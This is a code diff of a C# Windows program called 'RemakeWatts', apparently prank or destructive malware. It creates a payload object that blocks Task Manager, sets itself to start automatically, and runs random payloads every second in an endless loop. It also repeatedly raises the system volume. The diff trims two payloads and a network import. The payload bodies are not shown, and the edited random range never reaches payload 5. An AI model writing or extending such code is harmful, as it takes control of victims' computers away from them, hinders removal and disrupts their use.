@@ -1,16 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 using System.Media;
 using System.Runtime.InteropServices;
-using System.Net;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace RemakeWatts
 {
@@ -26,7 +19,7 @@ namespace RemakeWatts
             Random random = new Random();
             int x = random.Next(0, 1270);
             int y = random.Next(0, 920);
-            
+
             this.StartPosition = FormStartPosition.Manual;
             this.Location = new Point(x, y);
             this.ShowInTaskbar = false;
@@ -44,12 +37,12 @@ namespace RemakeWatts
             Payload payload = new Payload();
             payload.BlockTaskMngr();
             payload.AutoStart();
-            while(true)
+            while (true)
             {
                 Random random = new Random();
-                
-                int x = random.Next(1, 7);
-                switch(x)
+
+                int x = random.Next(1, 5);
+                switch (x)
                 {
                     case 1:
                         payload.payload1();
@@ -66,12 +59,6 @@ namespace RemakeWatts
                     case 5:
                         payload.payload5();
                         break;
-                    case 6:
-                        payload.payload6();
-                        break;
-                    case 7:
-                        payload.payload7();
-                        break;
                 }
                 Thread.Sleep(1000);
             }
@@ -79,7 +66,7 @@ namespace RemakeWatts
 
         private void VOL()
         {
-            for (int i = 0; i < 20; i++) 
+            for (int i = 0; i < 20; i++)
             {
                 SendMessage(this.Handle, WM_APP_COMMAND, this.Handle, (IntPtr)APP_COMMAND_VOLUME_UP);
             }
